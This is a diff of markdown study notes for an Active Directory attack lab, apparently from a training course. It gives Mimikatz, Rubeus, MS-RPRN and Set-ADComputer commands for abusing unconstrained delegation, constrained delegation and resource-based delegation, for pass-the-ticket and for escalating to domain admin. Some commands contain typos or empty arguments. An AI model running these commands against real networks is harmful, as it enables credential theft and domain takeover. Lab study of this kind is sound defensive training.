@@ -173,7 +173,7 @@ Get-ADUser -Filter {TrustedForDelegation -eq $True}
 ```
 
 #### Attack
-- Compromise the server(s) where Unconstrained delegation is enabled.
+- Compromise the server where Unconstrained delegation is enabled.
 - We must trick or wait for a domain admin to connect a service on appsrv.
 
 ```powershell
@@ -182,9 +182,7 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
 - The DA token could be reused:
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::ptt
-C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-
-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 ```
 
 >__Printer Bug__
@@ -204,7 +202,7 @@ MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local
 
 >From a Linux machine attack: [Coercer](https://github.com/p0dalirius/Coercer) for other MS protocols that can be abused for coercion.
 
-- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
+- Copy the base64 encoded TGT, remove any extra spaces & use it on the student VM:
 ```powershell
 Rubeus.exe ptt /tikcet:
 ```
@@ -263,8 +261,7 @@ __Rubeus__
 ```powershell
 Rubeus.exe s4u /user:websvc
 /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
-9470ade07e5412d7 
-/impersonateuser:Administrator
+9470ade07e5412d7 /impersonateuser:Administrator
 /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
 /ptt
 ```
@@ -285,8 +282,7 @@ _To abuse RBCD_ in the most effective form, we just need two privileges:
 __Attack__
 - User 'ciadmin' has Write permissions over the dcorp-mgmt machine!
 ```powershell
-Find-InterestingDomainACL | ?{$_.identityreferencename -
-match 'ciadmin'}
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 ```
 
 - Using the AD module, configure RBCD on dcorp-mgmt for student machines :
@@ -295,8 +291,7 @@ $comps = 'dcorp-student1$','dcorp-student2$'
 ```
 - We are delegating student machine to impersonate as any user on `dcorp-mgmt`
 ```powershell
-Set-ADComputer -Identity dcorp-mgmt 
--PrincipalsAllowedToDelegateToAccount $comps
+Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
 ```
 
 - Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:
@@ -322,6 +317,13 @@ winrs -r:dcorp-mgmt cmd.exe
 - sIDHistory can be abused in two ways of escalating privileges within a forest:
 	- krbtgt hash of the child
 	- Trust tickets
+
+#### Trust Key Attack
+
+
+#### Krbtgt Attack
+
+
 ---
 ### Trust Key Abuse
 #### Attack
